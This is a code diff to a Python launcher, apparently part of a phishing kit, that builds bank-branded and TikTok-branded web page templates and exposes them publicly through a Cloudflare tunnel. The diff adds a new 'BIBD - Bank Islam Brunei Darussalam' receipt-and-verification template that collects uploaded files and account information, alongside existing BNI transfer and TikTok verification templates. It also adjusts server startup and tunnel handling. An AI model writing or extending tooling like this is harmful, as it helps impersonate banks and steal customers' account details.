@@ -117,6 +117,17 @@ TEMPLATES = {
         "dir": os.path.join(TEMPLATES_DIR, "tiktok"),
         "public_dir": os.path.join(TEMPLATES_DIR, "tiktok", "public"),
     },
+    "bibd": {
+        "name": "BIDB - Brunei Darussalam",
+        "icon": "[3]",
+        "label": "BIDB Receipt + Verification",
+        "title": "BIDB Brunei Darussalam",
+        "description": "Resit Transaksi BIDB Brunei Darussalam",
+        "favicon": "bibd.png",
+        "og_image": "/bibdbrunei_logo.jpg",
+        "dir": os.path.join(TEMPLATES_DIR, "bibd"),
+        "public_dir": os.path.join(TEMPLATES_DIR, "bibd", "public"),
+    },
 }
 
 
@@ -368,7 +379,6 @@ class Engine:
         time.sleep(0.2)
         sys.stdout.write("\r" + " " * 40 + "\r")
         sys.stdout.flush()
-        # Restore package.json after build (whether success or failure)
         if did_downgrade and os.path.exists(pkg_bak):
             try:
                 shutil.copy2(pkg_bak, pkg_json)
@@ -386,25 +396,33 @@ class Engine:
         return False
 
     def start_server(self):
+        # Kill port first jika ada yang masih jalan
         if self.check_port(self.app_port):
             print(f"{C.YLW}  Port {self.app_port} in use, clearing...{C.RST}")
             self.kill_port(self.app_port)
-            time.sleep(2)
+            time.sleep(3)
         env = os.environ.copy()
         env["NEXT_TELEMETRY_DISABLED"] = "1"
-        self.nextjs_proc = subprocess.Popen(["npx", "next", "start", "-p", str(self.app_port)], cwd=self.app_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
+        self.nextjs_proc = subprocess.Popen(
+            ["npx", "next", "start", "-p", str(self.app_port)],
+            cwd=self.app_dir, env=env,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            shell=True
+        )
         print(f"{C.CYN}  Starting server on port {self.app_port}...{C.RST}")
-        for i in range(15):
+        # Tunggu sampai port benar-benar terbuka (max 30 detik)
+        for i in range(30):
             time.sleep(1)
             if self.check_port(self.app_port):
                 print(f"{C.GRN}  Server running at http://localhost:{self.app_port}{C.RST}")
                 return True
-            sys.stdout.write(f"\r{C.CYN}  Waiting... ({i+1}s){C.RST}  ")
-            sys.stdout.flush()
+            if i % 5 == 0 and i > 0:
+                sys.stdout.write(f"\r{C.CYN}  Waiting for server... ({i}s){C.RST}  ")
+                sys.stdout.flush()
         sys.stdout.write("\r" + " " * 40 + "\r")
         sys.stdout.flush()
-        print(f"{C.GRN}  Server starting...{C.RST}")
-        return True
+        print(f"{C.RED}  Server gagal start dalam 30 detik!{C.RST}")
+        return False
 
     def _find_cloudflared(self):
         return _find_cloudflared_path()
@@ -412,39 +430,43 @@ class Engine:
     def start_tunnel(self):
         cf = self._find_cloudflared()
         if not cf:
-            print(f"{C.RED}  cloudflared not found!{C.RST}")
-            print(f"{C.DIM}     Install: pkg install cloudflared{C.RST}")
-            return self._start_ngrok_fallback()
+            print(f"{C.RED}  Cloudflared tidak ditemukan!{C.RST}")
+            return None
+        
         self.kill_tunnel()
-        time.sleep(1)
+        time.sleep(2)
         print(f"{C.CYN}  Starting Cloudflare Tunnel...{C.RST}")
         log = os.path.join(self.app_dir, "tunnel.log")
-        self.tunnel_proc = subprocess.Popen([cf, "tunnel", "--url", f"http://localhost:{self.app_port}"], stdout=open(log, "w"), stderr=subprocess.STDOUT, **self._nw())
-        ssl_error_detected = False
+        # Hapus log lama
+        try:
+            if os.path.exists(log):
+                os.remove(log)
+        except: pass
+        
+        self.tunnel_proc = subprocess.Popen(
+            [cf, "tunnel", "--url", f"http://localhost:{self.app_port}", "--no-autoupdate"],
+            stdout=open(log, "w", encoding="utf-8"), 
+            stderr=subprocess.STDOUT, 
+            **self._nw()
+        )
+        
         for i in range(30):
             time.sleep(2)
             try:
-                with open(log) as f:
+                with open(log, "r", encoding="utf-8") as f:
                     content = f.read()
-                    # Check for SSL certificate errors (common in Termux/Android)
-                    if "x509" in content or "certificate" in content.lower() and "unknown authority" in content:
-                        ssl_error_detected = True
-                        print(f"{C.YLW}  Cloudflared SSL error detected (Termux/Android issue){C.RST}")
-                        self.kill_tunnel()
-                        return self._start_ngrok_fallback()
                     all_urls = re.findall(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", content)
-                    # Get unique URLs, filter api.trycloudflare.com, prefer longer subdomains
                     unique_urls = list(set(all_urls))
                     tunnel_urls = [u for u in unique_urls if "api" not in u.lower()]
                     if tunnel_urls:
-                        # Prefer URL with longer subdomain (more likely to be actual tunnel)
                         self.url = max(tunnel_urls, key=lambda u: len(u.split(".")[0]))
-                        print(f"{C.GRN}  Cloudflare Tunnel ready! (No warning page!){C.RST}")
+                        print(f"{C.GRN}  Cloudflare Tunnel ready!{C.RST}")
                         return self.url
             except Exception:
                 pass
-        if not ssl_error_detected:
-            print(f"{C.YLW}  Could not get tunnel URL{C.RST}")
+        
+        print(f"{C.RED}  Cloudflare Tunnel gagal terhubung.{C.RST}")
+        print(f"{C.DIM}  Cek tunnel.log untuk detail error.{C.RST}")
         return None
 
     def _start_ngrok_fallback(self):
@@ -620,7 +642,7 @@ def choose_template(eng):
     tmpl_keys = list(TEMPLATES.keys())
     print(f"{C.CYN}  Pilih template (1-{len(tmpl_keys)}): {C.RST}", end="")
     choice = input().strip()
-    if choice in ["1", "2"]:
+    if choice in [str(i) for i in range(1, len(tmpl_keys)+1)]:
         idx = int(choice) - 1
         if idx < len(tmpl_keys):
             key = tmpl_keys[idx]
@@ -650,16 +672,19 @@ def main():
     print(f"{C.DIM}  |       Template transfer bank BNI               |{C.RST}")
     print(f"{C.B}{C.WHT}  |  [2] TikTok - Video Share Link                  |{C.RST}")
     print(f"{C.DIM}  |       Template verifikasi video TikTok         |{C.RST}")
+    print(f"{C.B}{C.WHT}  |  [3] BIBD - Bank Islam Brunei Darussalam        |{C.RST}")
+    print(f"{C.DIM}  |       Upload file + info akun BIBD             |{C.RST}")
     print(f"{C.B}{C.WHT}  +-------------------------------------------------+{C.RST}")
     print()
 
+    tmpl_keys = list(TEMPLATES.keys())
+
     while True:
         try:
-            print(f"{C.CYN}  Pilih template (1-2): {C.RST}", end="")
+            print(f"{C.CYN}  Pilih template (1-{len(tmpl_keys)}): {C.RST}", end="")
             ch = input().strip()
-            if ch in ["1", "2"]:
+            if ch in [str(i) for i in range(1, len(tmpl_keys)+1)]:
                 idx = int(ch) - 1
-                tmpl_keys = list(TEMPLATES.keys())
                 eng.current_template = tmpl_keys[idx]
                 print(f"\n{C.GRN}  Template dipilih: {TEMPLATES[eng.current_template]['name']}{C.RST}")
                 time.sleep(0.5)
